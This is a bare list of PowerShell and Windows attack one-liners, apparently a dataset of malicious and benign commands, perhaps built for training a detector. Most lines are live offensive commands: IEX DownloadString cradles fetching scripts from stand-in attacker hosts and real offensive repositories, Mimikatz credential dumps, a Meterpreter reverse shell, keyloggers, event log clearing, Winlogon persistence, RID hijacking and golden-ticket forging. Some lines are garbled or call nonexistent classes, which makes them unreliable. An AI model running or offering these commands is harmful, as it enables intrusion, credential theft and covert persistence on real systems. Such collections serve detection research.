Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1
Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding}
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1
Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}
Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp
$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list
cmd /c "${ps_exec_location}" -accepteula -i -s cmd.exe /c logman update trace "${session}" --p "${provider}" -ets
Invoke-CredentialPhisher
$x="$env:temp\jxm.exe";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')
$payload = [System.Text.Encoding]::UTF8.GetBytes("<malicious payload>"); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = "powershell.exe"; $process.StartInfo.Arguments = "-ExecutionPolicy Bypass -NoProfile -EncodedCommand " + [Convert]::ToBase64String($payload); $process.Start()
Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> }
Invoke-Expression -Command "IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')"
Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\webcam.mov'
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')"
Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like "ADFS*"} ; Write-Host "`nCertificates retrieved successfully"
powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
ls -recurse ; get-childitem -recurse ; gci -recurse
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')}
Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an'
$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke
Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & "${pua_file}"
powershell -exec bypass -command "Invoke-Mimikatz -DumpCreds"
powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"
powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');"
Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > }
Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick
Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe
Invoke-RIDHijacking -User alice -RID 500
$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript("Invoke-Mimikatz -DumpCreds"); $Bypass.Invoke()
powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))";
powershell.exe -ExecutionPolicy Bypass -NoProfile -File "C:\Users\attacker\script.ps1"
powershell -ep bypass -c "Invoke-Mimikatz"
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
cd $env:temp ; .\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\brute_force.txt
powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1
Invoke-NinjaCopy -Path 'C:\windows\clrt\clrt.dit' -LocalDestination 'C:\windows\temp\clrt.dit'
Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443
Start-Process ${nsudo_path} -Argument "-U:T -P:E cmd" ; Start-Sleep -Second 5 ; Stop-Process -Name "cmd" -force -erroraction silentlycontinue
$command = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')"; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }
Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')"
Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'
.\wifi.ps1 -Off
powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')"
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')}
tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;
Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address}
$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1'
Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable
Get-WMIObject Win32_Group
Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
python ${file_name} -i ${IP}
powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\somecode.ps1
Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>'
$payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz")
Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500
./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
python ${filename} -i ${host_ip}
powershell.exe -exec bypass -c "Invoke-Mimikatz"
Start-Process ${dirlister_path} ; Start-Sleep -Second 4 ; Stop-Process -Name "DirLister"
Start-Process ${webbrowserpassview_path} ; Start-Sleep -Second 4 ; Stop-Process -Name "WebBrowserPassView"
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}
$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
$payload = 'IEX (New-Object Net.WebClient).DownloadString("http://somesurl.com/juve.ps1")'; Invoke-Expression $payload
Get-WmiObject -Class Win32_UserAccount
Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 10.0.0.1 -Lport 443; Invoke-C
Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='portfolio'
$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2
Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)
powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code')
Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path}
${mwcpath}\${mwcname} "${xml_payload}" output.txt
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content"
net view \\${remote.host.fqdn} /all
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, ${binaryToExec}" -Force
Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') }
dir
$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' }
Invoke-ExecuteMSBuild
Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe'
Get-Domain
ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator
$pattern = "password";$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG";foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" };foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username
$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString
iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes
Function MyGetProc { Get-Process }; MyGetProc
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
Invoke-SQLEscalatePriv -Verbose -Instance "SQLServer1\Instance1"
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'
$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path
netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23
gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
Find-DomainShare -CheckShareAccess
$net = "10.10.1.";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace("\s+","").replace("`r","").replace("`n"," "); Write-Output "$net$_ $r"} | tee ip_hostname.txt
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
new-item "c:\users\public\share" -itemtype directory;New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon"
$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream
([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path
$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
Get-ForestGlobalCatalog
Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); } "@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }
Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine("Executed"); } }'; [MyClass]::Run()
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo